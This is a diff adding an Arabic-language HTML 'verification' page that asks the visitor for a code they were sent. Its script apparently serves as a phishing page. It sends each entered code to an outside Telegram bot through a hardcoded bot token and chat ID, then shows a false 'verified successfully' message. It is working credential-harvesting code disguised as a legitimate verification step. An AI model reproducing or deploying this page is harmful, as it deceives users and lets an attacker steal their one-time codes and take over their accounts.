@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>التحقق</title>
+  <style>
+    body {font-family: Tahoma, Arial; background:#f5fff5; margin:0; padding:0;}
+    .container {max-width:400px; margin:50px auto; background:#eaffea; padding:25px; border-radius:12px; box-shadow:0 4px 8px rgba(0,0,0,0.1);}
+    h2 {text-align:center; color:#2b7a2b; margin-bottom:20px;}
+    label {display:block; margin-bottom:8px; font-weight:bold; color:#333;}
+    input, button {width:100%; padding:12px; margin-bottom:15px; border:1px solid #ccc; border-radius:6px; font-size:15px;}
+    button {background:#2b7a2b; color:white; font-weight:bold; cursor:pointer; border:none;}
+    button:hover {background:#1c551c;}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>التحقق</h2>
+    <label for="code">أدخل كود التحقق</label>
+    <input type="text" id="code" placeholder="ادخل الكود المرسل">
+
+    <button onclick="sendVerify()">تأكيد</button>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "7994339638:AAHgur93jAzxz55NZTtD5J3WKgDaWZtlV3E";
+    const CHAT_ID = "16420566";
+
+    function sendVerify() {
+      const code = document.getElementById("code").value;
+
+      const message = `✅ تم إدخال كود التحقق:\nالكود: ${code}`;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({chat_id: CHAT_ID, text: message})
+      }).then(() => {
+        alert("تم التحقق بنجاح ✅");
+      });
+    }
+  </script>
+</body>
+</html>
